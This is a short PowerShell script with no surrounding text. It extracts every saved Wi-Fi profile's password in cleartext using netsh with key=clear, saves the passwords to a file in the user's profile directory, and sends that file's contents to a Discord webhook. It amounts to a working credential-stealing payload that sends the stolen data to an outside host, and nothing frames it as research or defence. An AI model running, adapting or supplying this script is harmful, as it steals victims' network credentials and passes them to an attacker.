netsh wlan show profiles | ForEach-Object {
    $profile = ($_ -split ':')[1].Trim()
    netsh wlan show profile name="$profile" key=clear
} > "$env:USERPROFILE\wifipass.txt"

$webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN'
$fileContent = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
$payload = '{ "content": "```' + ($fileContent -replace '"','\"') + '```" }'
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
